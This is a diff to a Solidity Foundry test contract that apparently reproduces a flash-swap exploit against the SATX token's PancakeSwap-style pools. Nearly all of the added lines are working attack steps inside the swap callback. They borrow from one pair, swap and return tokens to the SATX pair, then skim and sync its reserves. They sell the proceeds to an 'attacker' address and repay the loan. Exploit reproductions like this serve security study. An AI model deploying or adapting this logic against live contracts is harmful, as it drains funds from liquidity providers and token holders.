@@ -65,20 +65,44 @@ contract ContractTest is Test {
         uint256 amount1,
         bytes calldata data
     ) external {
+        console2.log("--- ~ sender:", sender, amount0, amount1);
+        console2.log("--- ~ sender:", SATX.balanceOf(address(pair_WBNB_SATX)));
         console2.log(
             "--- ~ sender:",
-            sender,
-            amount0,
-            amount1,
-            SATX.balanceOf(address(pair_WBNB_SATX))
+            msg.sender,
+            address(pair_WBNB_CAKE),
+            address(pair_WBNB_SATX)
         );
         if (msg.sender == address(pair_WBNB_CAKE)) {
+            console2.log("1111");
             pair_WBNB_SATX.swap(
                 100000000000000,
                 SATX.balanceOf(address(pair_WBNB_SATX)) / 2,
                 attacker,
                 data
             );
+            SATX.transfer(
+                address(pair_WBNB_SATX),
+                SATX.balanceOf(address(this))
+            );
+            pair_WBNB_SATX.skim(attacker);
+            pair_WBNB_SATX.sync();
+            WBNB.transfer(address(pair_WBNB_SATX), 100000000000000);
+            address[] memory path = new address[](2);
+            path[0] = address(SATX);
+            path[1] = address(WBNB);
+            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                SATX.balanceOf(address(this)),
+                0,
+                path,
+                attacker,
+                type(uint256).max
+            );
+            WBNB.transfer(address(pair_WBNB_CAKE), 60150600000000000000);
+        } else if (msg.sender == address(pair_WBNB_SATX)) {
+            console2.log("2222");
+            WBNB.transfer(address(pair_WBNB_SATX), 52000000000000000000);
         }
     }
+    //fallback() external payable {}
 }
